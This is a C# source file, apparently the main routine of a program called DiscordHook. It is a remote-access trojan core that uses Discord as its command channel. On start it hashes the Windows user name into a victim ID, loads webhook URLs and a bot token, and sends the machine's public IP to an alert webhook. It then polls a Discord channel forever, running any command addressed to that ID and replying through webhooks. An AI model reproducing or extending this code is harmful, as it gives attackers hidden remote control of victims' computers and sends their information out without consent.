using System;
using System.Threading.Tasks;
using static DiscordHook.Alerts;
using static DiscordHook.DiscordApi;
using static DiscordHook.CommandHandler;
using static DiscordHook.Utility;

namespace DiscordHook
{
    internal static class Program
    {
        private static async Task Main(string[] args)
        {
            var hashprefix = ComputeSha256Hash(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            var alerthook = await GetAlertWebHook();
            await Task.Delay(500);
            var replyhook = await GetReplyWebHook();
            await Task.Delay(500);
            var botToken = await GetBotToken();
            await Task.Delay(500);
            var channelurl = await GetChannelUrl();
            await Task.Delay(500);
            var commandhook = await GetCommandWebHook();
            await Task.Delay(500);

            await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);

            while (true)
            {
                await Task.Delay(1000);
                var command = await GetCommand(botToken, channelurl);
                if (command == "null" || !command.Contains(hashprefix) ) continue;
                await HandleCmd(command.Substring(65), replyhook, commandhook);
            }

            
            // ReSharper disable once FunctionNeverReturns
        }
    }
}